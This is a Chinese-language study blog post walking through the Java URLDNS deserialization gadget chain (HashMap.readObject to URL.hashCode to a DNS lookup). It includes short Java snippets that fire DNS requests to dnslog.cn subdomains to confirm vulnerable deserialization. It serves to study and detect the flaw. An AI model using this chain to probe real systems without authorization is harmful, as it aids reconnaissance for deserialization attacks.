# Java反序列化-URLDNS链

正式开始学习Java反序列化，在这个过程中写点博客的同时加强理解

## URLDNS链 介绍

URLDNS 是[ysoserial](https://github.com/frohoff/ysoserial/blob/master/src/main/java/ysoserial/payloads/URLDNS.java)中利用链的一个名字，通常用于检测是否存在Java反序列化漏洞。该利用链具有如下特点：

- 不限制jdk版本，使用Java内置类，对第三方依赖没有要求。所以通常用于检测反序列化的点
- 目标无回显，可以通过DNS请求来验证是否存在反序列化漏洞
- URLDNS利用链，只能发起DNS请求，并不能进行其他利用

ysoserial中列出的Gadget:

```Java
 *   Gadget Chain:
 *     HashMap.readObject()
 *       HashMap.putVal()
 *         HashMap.hash()
 *           URL.hashCode()
```

为什么选择HashMap作为入口类 ?

- 参数种类多并且可控
- 类可反序列化，实现了了序列化接口
- 最终走到反序列化触发的readObject

## URL类

从0开始找到这条URLDNS链，先看URL类如何触发DNS请求

![img](https://my.feishu.cn/space/api/box/stream/download/asynccode/?code=YzA3MzE4NmUwNGQ2MDNjMzVkMzhlYjY3MDg3NTZlMTRfQlpZSThCZHFDM0JXV2d5QTE1QzFsVUNsTEtRaVB3aDBfVG9rZW46RVh6MWJ2VDZ0b2Z5TmV4MWs4bGM0VWZ3bjlmXzE3NzI0Njk5MTQ6MTc3MjQ3MzUxNF9WNA)

进入URL类查看`hashCode()`方法，在1109行调用

```Java
public synchronized int hashCode() {
    if (hashCode != -1)
        return hashCode;

    hashCode = handler.hashCode(this);
    return hashCode;
}
```

跟进`hashCode()`方法，在方法内部我们能发现内部调用了`getHostAddress()`:

```Java
protected int hashCode(URL u) {
    int h = 0;
    
    ......

    // Generate the host part.
    InetAddress addr = getHostAddress(u);
    if (addr != null) {
        h += addr.hashCode();
    } else {
        String host = u.getHost();
        if (host != null)
            h += host.toLowerCase(Locale.ROOT).hashCode();
    }

    ......

    return h;
}
```

跟进`getHostAddress()` 方法

```Java
protected InetAddress getHostAddress(URL u) {
    return u.getHostAddress();
}
```

继续跟进`u.getHostAddress()`

```Java
synchronized InetAddress getHostAddress() {
    if (hostAddress != null) {
        return hostAddress;
    }

    if (host == null || host.isEmpty()) {
        return null;
    }
    try {
        hostAddress = InetAddress.getByName(host);
    } catch (UnknownHostException e) {
        return null;
    }
    return hostAddress;
}
```

这几行代码做的事情是:

- 缓存检查：如果 `hostAddress` 已经被解析并缓存（非 `null`），直接返回，避免重复 DNS 查询。
- 输入校验：如果成员变量 `host`（应为域名或 IP 字符串，如 `"``example.com``"`）为空或空字符串，则无法解析，返回 `null`。
- 调用 `InetAddress.getByName(host)` 尝试将 `host`解析为 `InetAddress` 对象。
- 如果域名不存在或网络问题，抛出 `UnknownHostException`，捕获后返回 `null`。

**InetAddress.getByName(host)，它的作⽤是根据主机名，获取其****IP****地址，在⽹络上其实就是⼀次****DNS****查询。**

总的来说就是URL类在调用其`hashCode()`方法能触发DNS请求

```Java
public static void main(String[] args) throws IOException, NoSuchFieldException, IllegalAccessException {
    URL url = new URL("http://fyrtmf.dnslog.cn");
    url.hashCode();
}
```

![img](https://my.feishu.cn/space/api/box/stream/download/asynccode/?code=ZTBjYmJmMzQ3N2VkMjE4NTVlMmNlMGNiZTI1ZDMyZTZfVGo0T0JQeTA0aEEycERISVhEdkI5SG5udFdYQ1hWNFdfVG9rZW46RXFMa2Jmdml2b3NZQkZ4c0thcmNqZGRmbmJOXzE3NzI0Njk5MTQ6MTc3MjQ3MzUxNF9WNA)

## HashMap类

### 选择HashMap的原因

#### 一、有序列化接口

```Java
public class HashMap<K,V> extends AbstractMap<K,V>
    implements Map<K,V>, Cloneable, Serializable{
    ......
    }
```

#### 二、重写了readObject方法

![img](https://my.feishu.cn/space/api/box/stream/download/asynccode/?code=Y2MxYzIxZTY5YTViNmYzN2JjMTQ3MDE5N2I2N2M5YzNfc1dRVkczOEV5WWJjb0JYNmpmSFdUZ3JsSDVQMlZLUlRfVG9rZW46VG5tR2J3YUpYb2cxVnd4c20zOGNNcXhLblZiXzE3NzI0Njk5MTQ6MTc3MjQ3MzUxNF9WNA)

#### 三、jdk原生自带

"**为什么 HashMap 要自己实现 writeObject 和 readObject 方法，而不是使用 JDK 统一的默认****序列化****和反序列化操作呢？**

首先要明确序列化的目的，将 Java 对象序列化，一定是为了在某个时刻能够将该对象反序列化，而且一般来讲，序列化和反序列化所在的机器是不同的，因为序列化最常用的场景就是跨机器的调用，而序列化和反序列化的一个最基本的要求就是：反序列化之后的对象与序列化之前的对象是一致的。

HashMap 中，由于 Entry 的存储位置是根据 Key 的 Hash 值来计算，然后存放到数组中的。对于同一个 Key，在不同的 JVM 实现中计算得出的 Hash 值可能是不同的。Hash 值不同导致的结果就是：有可能一个 HashMap 对象的反序列化结果与序列化之前的结果不一致。

即有可能序列化之前，Key="AAA" 的元素放在数组的第 0 个位置，而反序列化后，根据 Key 获取元素的时候，可能需要从数组为 2 的位置来获取，而此时获取到的数据与序列化之前肯定是不同的。"

### 跟进readObject

找到HashMap的readObject 方法，在`putVal()`内部调用了`hash()`

```Java
for (int i = 0; i < mappings; i++) {
    @SuppressWarnings("unchecked")
        K key = (K) s.readObject();
    @SuppressWarnings("unchecked")
        V value = (V) s.readObject();
    putVal(hash(key), key, value, false, false);
}
```

跟进HashMap重写的hash函数

```Java
static final int hash(Object key) {
    int h;
    return (key == null) ? 0 : (h = key.hashCode()) ^ (h >>> 16);
}
```

我们可以看到，传入一个对象Object key，当key不为null时调用其`hashCode()`那么如果我们把key变成我们的url对象，理论上就可以调用`url.hashcode()`

那么现在就去找调用`putVal()`的地方，在632行的`put()`方法中：

```Java
public V put(K key, V value) {
    return putVal(hash(key), key, value, false, true);
}
```

因此我们需要调用HashMap的`put()`方法传递URL类对象为key值

```Java
public static void main(String[] args) throws IOException, NoSuchFieldException, IllegalAccessException {
    URL url = new URL("http://h6meip.dnslog.cn");
    HashMap<Object,Integer> hashMap = new HashMap<Object,Integer>();
    hashMap.put(url,123);
}
```

DNS请求成功

![img](https://my.feishu.cn/space/api/box/stream/download/asynccode/?code=NDEwODFmOTk5MDk4ZDcyYTgwN2MxYWM3MjlhMDUwMDVfdnFlY0laVzVsdGQwQlQ5UXhyaHRqc1JhaEdmUG40allfVG9rZW46T2daUGJzSTVSb1lYR0V4U1cxNmNIZzRabmRjXzE3NzI0Njk5MTQ6MTc3MjQ3MzUxNF9WNA)